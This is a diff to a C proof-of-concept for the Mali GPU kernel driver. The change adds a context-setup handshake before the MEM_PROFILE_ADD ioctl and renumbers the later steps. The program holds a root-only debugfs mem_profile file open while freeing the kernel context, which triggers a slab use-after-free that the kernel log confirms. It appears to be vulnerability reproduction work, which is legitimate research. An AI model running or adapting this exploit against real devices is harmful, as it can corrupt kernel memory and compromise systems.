@@ -32,6 +32,8 @@
 #include <sys/types.h>
 #include <sys/stat.h>
 
+#include "../../tools/mali_handshake.h"
+
 #define UNUSED(x) (x) __attribute__((unused))
 #define MAX_PATH 256
 
@@ -176,7 +178,12 @@ int main(int argc, char **argv)
 	if (mali_fd < 0) FAIL("open %s: %s", dev, strerror(errno));
 	INFO("mali fd=%d", mali_fd);
 
-	STEP(2, "ioctl KBASE_IOCTL_MEM_PROFILE_ADD (cmd=#%d size=%zu)",
+	STEP(2, "Kbase VERSION_CHECK + SET_FLAGS (create kcontext)");
+	if (mali_kbase_setup(mali_fd) < 0)
+		FAIL("Kbase setup failed: %s (errno=%d)", strerror(errno), errno);
+	INFO("handshake OK; kcontext exists");
+
+	STEP(3, "ioctl KBASE_IOCTL_MEM_PROFILE_ADD (cmd=#%d size=%zu)",
 	     KBASE_IOCTL_MEM_PROFILE_ADD, (size_t)sizeof(add));
 	memset(&add, 0, sizeof(add));
 	add.buffer = (unsigned long long)(uintptr_t)marker;
@@ -190,12 +197,12 @@ int main(int argc, char **argv)
 		INFO("ioctl OK; expect debugfs node created under kctx->kctx_dentry");
 	}
 
-	STEP(3, "locate kctx debugfs dir");
+	STEP(4, "locate kctx debugfs dir");
 	if (find_kctx_dir(kctxdir, sizeof(kctxdir), strrchr(dev, '/') + 1) < 0)
 		FAIL("kctx directory not found under /sys/kernel/debug/*/ctx");
 	INFO("kctxdir=%s", kctxdir);
 
-	STEP(4, "open the per-kctx %s/mem_profile file (root only)", kctxdir);
+	STEP(5, "open the per-kctx %s/mem_profile file (root only)", kctxdir);
 	snprintf(filepath, sizeof(filepath), "%s/mem_profile", kctxdir);
 	prof_fd = open(filepath, O_RDONLY);
 	if (prof_fd < 0)
@@ -203,7 +210,7 @@ int main(int argc, char **argv)
 		     filepath, strerror(errno));
 	INFO("prof fd=%d (kept open while we free the kctx)", prof_fd);
 
-	STEP(5, "close mali fd → kbase_release → kbase_destroy_context → vfree(kctx)");
+	STEP(6, "close mali fd → kbase_release → kbase_destroy_context → vfree(kctx)");
 	close(mali_fd); mali_fd = -1;
 	INFO("mali fd closed — from this point the debugfs fd references freed memory");
 
@@ -242,7 +249,7 @@ int main(int argc, char **argv)
 			     "contain slab-use-after-free — UAF confirmed by kernel log");
 	}
 
-	STEP(6, "summary");
+	STEP(7, "summary");
 	if (g_log) INFO("full log at %s", g_logfile);
 out:
 	if (exit_code) WARN("PoC finished WITH failures (exit=%d)", exit_code);
